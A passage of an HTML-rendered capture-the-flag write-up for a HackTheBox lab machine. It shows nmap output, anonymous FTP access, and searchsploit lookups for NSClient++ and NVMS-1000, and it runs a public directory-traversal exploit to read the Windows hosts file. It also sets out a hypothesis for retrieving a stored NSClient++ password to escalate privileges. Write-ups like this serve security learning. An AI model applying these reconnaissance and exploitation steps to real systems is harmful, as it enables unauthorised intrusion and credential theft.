napster?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">8443/tcp  open  ssl/https-alt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| fingerprint-strings:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     HTTP/1.1 404</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Content-Length: 18</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Document not found</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   GetRequest:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     HTTP/1.1 302</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Content-Length: 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Location: /index.html</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     workers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     jobs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     submitted</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     errors</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     threads</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_    ini&quot;}}]}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssl-cert: Subject: commonName=localhost</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid before: 2020-01-14T13:24:20</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_Not valid after:  2021-01-13T13:24:20</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_ssl-date: TLS randomness does not represent time</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49664/tcp open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49665/tcp open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49666/tcp open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49667/tcp open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49668/tcp open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49669/tcp open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49670/tcp open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF-Port80-TCP:V=7.80%I=7%D=6/11%Time=5EE2385B%P=x86_64-unknown-linux-gnu%r</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:(NULL,6B,&quot;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20te</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:xt/html\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:0\r\n\r\n&quot;)%r(GetRequest,1B4,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:20text/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthIn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:fo:\x20\r\n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&quot;-//W3C//DTD</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:\x20XHTML\x201\.0\x20Transitional//EN\&quot;\x20\&quot;http://www\.w3\.org/TR/xht</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:ml1/DTD/xhtml1-transitional\.dtd\&quot;&gt;\r\n\r\n&lt;html\x20xmlns=\&quot;http://www\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:.w3\.org/1999/xhtml\&quot;&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:\x20\x20\x20\x20&lt;script\x20type=\&quot;text/javascript\&quot;&gt;\r\n\x20\x20\x20\x2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:0\x20\x20\x20\x20window\.location\.href\x20=\x20\&quot;Pages/login\.htm\&quot;;\r</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:\n\x20\x20\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:r\n&quot;)%r(HTTPOptions,1B4,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:20\r\n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&quot;-//W3C//DTD\x20X</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:HTML\x201\.0\x20Transitional//EN\&quot;\x20\&quot;http://www\.w3\.org/TR/xhtml1/D</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:TD/xhtml1-transitional\.dtd\&quot;&gt;\r\n\r\n&lt;html\x20xmlns=\&quot;http://www\.w3\.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:org/1999/xhtml\&quot;&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:x20\x20\x20&lt;script\x20type=\&quot;text/javascript\&quot;&gt;\r\n\x20\x20\x20\x20\x20</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:\x20\x20\x20window\.location\.href\x20=\x20\&quot;Pages/login\.htm\&quot;;\r\n\x2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:0\x20\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:%r(RTSPRequest,1B4,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&quot;-//W3C//DTD\x20XHTML\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:x201\.0\x20Transitional//EN\&quot;\x20\&quot;http://www\.w3\.org/TR/xhtml1/DTD/xh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:tml1-transitional\.dtd\&quot;&gt;\r\n\r\n&lt;html\x20xmlns=\&quot;http://www\.w3\.org/1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:999/xhtml\&quot;&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\x20\x</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:20\x20&lt;script\x20type=\&quot;text/javascript\&quot;&gt;\r\n\x20\x20\x20\x20\x20\x20\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:x20\x20window\.location\.href\x20=\x20\&quot;Pages/login\.htm\&quot;;\r\n\x20\x20</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=6/11%Time=5EE23864%P=x86_64-unknown-lin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:ux-gnu%r(GetRequest,AE,&quot;HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLoc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:ation:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:0\0\0\0\0\0\0\0\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:\x03\x18\xc0\x03\x12\x10\n\tsubmitted\x12\x03\x18\xbf\x03\x12\x0c\n\x06</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:errors\x12\x02\x18\0\x12\r\n\x07threads\x12\x02\x18\x01\0ini\&quot;}}\]}\0\0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:\0&quot;)%r(HTTPOptions,36,&quot;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:nDocument\x20not\x20found&quot;)%r(FourOhFourRequest,36,&quot;HTTP/1\.1\x20404\r\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found&quot;)%r(RTSPRequest,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:36,&quot;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:0found&quot;)%r(SIPOptions,36,&quot;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:\r\nDocument\x20not\x20found&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host script results:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_clock-skew: 4m15s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb2-security-mode:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   2.02:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_    Message signing enabled but not required</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb2-time:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   date: 2020-06-11T14:04:39</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  start_date: N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap done: 1 IP address (1 host up) scanned in 235.93 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We want to look at FTP (21), Web servers (80 &amp; 8443) and Samba (139,445) first.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="network-reconnaissance-ftp">Network reconnaissance: FTP<a href="#network-reconnaissance-ftp" class="hash-link" aria-label="Direct link to Network reconnaissance: FTP" title="Direct link to Network reconnaissance: FTP">â€‹</a></h3><p><a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">Nmap</a> told us it was possible to connect to FTP anonymously but found nothing to
list so let&#x27;s try ourselves:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ftp 10.10.10.184</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connected to 10.10.10.184.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">220 Microsoft FTP Service</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Name (10.10.10.184:cyfun): Anonymous</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">230 User logged in.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Remote system type is Windows_NT.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ftp&gt; ls -a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">200 PORT command successful.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">125 Data connection already open; Transfer starting.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">01-18-20  12:05PM       &lt;DIR&gt;          Users</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">226 Transfer complete.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But there is nothing (or I thought so).</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="network-reconnaissance-http">Network reconnaissance: HTTP<a href="#network-reconnaissance-http" class="hash-link" aria-label="Direct link to Network reconnaissance: HTTP" title="Direct link to Network reconnaissance: HTTP">â€‹</a></h3><ul><li>port 80: <strong>NVMS-1000</strong> <a href="http://10.10.10.184/Pages/login.htm" target="_blank" rel="noopener noreferrer">http://10.10.10.184/Pages/login.htm</a><img loading="lazy" src="https://i.imgur.com/IyQLwTB.png" alt="NVMS-1000" class="img_ev3q"></li><li>port 8443: <strong>NSClient++</strong> <a href="https://10.10.10.184:8443/index.html" target="_blank" rel="noopener noreferrer">https://10.10.10.184:8443/index.html</a><img loading="lazy" src="https://i.imgur.com/qwmxhSs.png" alt="NSClient++" class="img_ev3q"></li></ul><p>Both services are asking for credentials but we have none yet.
Let&#x27;s see if they are vulnerable in a first place.</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="nsclient">NSClient++<a href="#nsclient" class="hash-link" aria-label="Direct link to NSClient++" title="Direct link to NSClient++">â€‹</a></h4><p>Let&#x27;s look for a <code>NSClient++</code> exploit:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ searchsploit --id NSClient</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--------------------------------------------------------------------------------------------------- ---------------------------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> Exploit Title                                                                                     |  EDB-ID</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--------------------------------------------------------------------------------------------------- ---------------------------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">NSClient++ 0.5.2.35 - Authenticated Remote Code Execution                                          | 48360</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">NSClient++ 0.5.2.35 - Privilege Escalation                                                         | 46802</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--------------------------------------------------------------------------------------------------- ---------------------------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Shellcodes: No Results</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ searchsploit -p 46802</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Exploit: NSClient++ 0.5.2.35 - Privilege Escalation</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      URL: https://www.exploit-db.com/exploits/46802</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     Path: /usr/share/exploitdb/exploits/windows/local/46802.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">File Type: ASCII text, with very long lines, with CRLF line terminators</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>Hypothesis:</strong></p><p>Once we have a low privileged shell it will be possible to run a command
(<code>nscp web -- password --display</code>) or read the config of NSClient++ to retrieve
a user password. Usually NSClient++ run as privileged user so with an app user
we could create some tasks that will be run by the app daemon and gain more
privileges.</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="nvms-1000">NVMS-1000<a href="#nvms-1000" class="hash-link" aria-label="Direct link to NVMS-1000" title="Direct link to NVMS-1000">â€‹</a></h4><p>Let&#x27;s look for a <code>NVMS-1000</code> exploit:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ searchsploit --id NVMS 1000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--------------------------------------------------------------------------------------------------- ---------------------------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> Exploit Title                                                                                     |  EDB-ID</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--------------------------------------------------------------------------------------------------- ---------------------------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">NVMS 1000 - Directory Traversal                                                                    | 47774</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">TVT NVMS 1000 - Directory Traversal                                                                | 48311</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--------------------------------------------------------------------------------------------------- ---------------------------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Shellcodes: No Results</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ searchsploit -p 47774</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Exploit: NVMS 1000 - Directory Traversal</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      URL: https://www.exploit-db.com/exploits/47774</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     Path: /usr/share/exploitdb/exploits/hardware/webapps/47774.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">File Type: UTF-8 Unicode text, with CRLF line terminators</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ searchsploit -p 48311</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Exploit: TVT NVMS 1000 - Directory Traversal</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      URL: https://www.exploit-db.com/exploits/48311</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     Path: /usr/share/exploitdb/exploits/hardware/webapps/48311.py</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">File Type: UTF-8 Unicode text, with CRLF line terminators</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So let&#x27;s see if the directory traversal works, I have to use <code>dos2unix</code> to
convert CRLF to LF (Windows to Linux).</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 -</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dos2unix: active code page: 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Usage : python exploit.py url filename outputname</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Example : python exploit.py http://10.10.10.10/ windows/win.ini win.ini</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 - http://10.10.10.184/ windows/win.ini win.ini</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dos2unix: active code page: 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host not vulnerable to Directory Traversal!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It failed but maybe because <code>C:\windows\win.ini</code> doesn&#x27;t exist. Let&#x27;s try with
something more reliable like the host file.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 - http://10.10.10.184/ Windows/System32/drivers/etc/hosts hosts.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dos2unix: active code page: 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Directory Traversal Succeeded</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Saving Output</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat hosts.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;response&gt;      &lt;status&gt;fail&lt;/status&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        &lt;errorCode&gt;536870934&lt;/errorCode&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;/response&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It&#x27;s a false positive occurring when there isn&#x27;t an file extension.
(At first glance it&#x27;s seems the exploit is not working or the server is
not vulnerable).</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="network-reconnaissance-smb">Network reconnaissance: SMB<a href="#network-reconnaissance-smb" class="hash-link" aria-label="Direct link to Network reconnaissance: SMB" title="Direct link to Network reconnaissance: SMB">â€‹</a></h3><p>From <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">Nmap</a> script it&#x27;s it is SMBv2 but we can&#x27;t list any shares:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ smbclient -L 10.10.10.184 -N</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">session setup failed: NT_STATUS_ACCESS_DENIED</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>As I said in <a href="https://blog.raw.pm/en/hackthebox-nest-write-up/#Network-Enumeration-finding-TempUser" target="_blank" rel="noopener noreferrer">Nest </a>,</p><blockquote><p>CrackMapExec, smb-enum-shares.nse and enum4linux don&#x27;t find any shares because they support only SMB v1 that is disabled.</p><p>But smbclient and msf modules works. So let&#x27;s start <a href="https://www.metasploit.com/" target="_blank" rel="noopener noreferrer">metasploit</a> console (msfconsole).</p></blockquote><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code 